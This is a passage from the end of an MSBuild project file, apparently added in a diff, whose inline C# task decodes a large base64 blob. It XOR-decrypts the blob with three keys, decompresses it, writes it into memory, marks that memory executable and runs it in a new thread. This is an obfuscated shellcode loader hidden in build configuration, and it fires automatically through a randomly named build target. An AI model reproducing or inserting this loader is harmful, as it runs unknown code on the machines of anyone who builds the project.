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");var DBXdj=System.Convert.FromBase64String("/xZaXFMiXiaBiIL9XLgufIePZDtJ22GLEewzjJLSNfs=");var ixKXG=System.Convert.FromBase64String("vRT6n4S+gx9d7DlL3R45V7s847jYiTvCEUzz1t3bKys=");var gAgEH=System.Convert.FromBase64String("C9SuRY/pvB1sj30n5ntQBQMZ4A5BhA/gCmYs2IBfDBk=");for(int RI=0;RI<Zk1llr.Length;RI++){Zk1llr[RI]^=DBXdj[RI%32];}for(int RI=0;RI<Zk1llr.Length;RI++){Zk1llr[RI]^=ixKXG[RI%32];}for(int RI=0;RI<Zk1llr.Length;RI++){Zk1llr[RI]^=gAgEH[RI%32];}var itli=new System.IO.MemoryStream();using(var i8CT=new System.IO.Compression.GZipStream(new System.IO.MemoryStream(Zk1llr),System.IO.Compression.CompressionMode.Decompress))i8CT.CopyTo(itli);Zk1llr=itli.ToArray();var FVZnq=ndWYrVU(System.IntPtr.Zero,(uint)Zk1llr.Length,0x3000u,0x04u);System.Runtime.InteropServices.Marshal.Copy(Zk1llr,0,FVZnq,Zk1llr.Length);uint tp4=0;SlV5m8T(FVZnq,(uint)Zk1llr.Length,0x20u,out tp4);aqd8YeQ(eKezMBa(System.IntPtr.Zero,0u,FVZnq,System.IntPtr.Zero,0u,System.IntPtr.Zero),0xFFFFFFFFu);return true;}]]></Code>
+    </Task>
+  </UsingTask>
+  <Target Name="EMNuLyLIYo">
+    <YDTITN0kgd />
+  </Target>
+</Project>
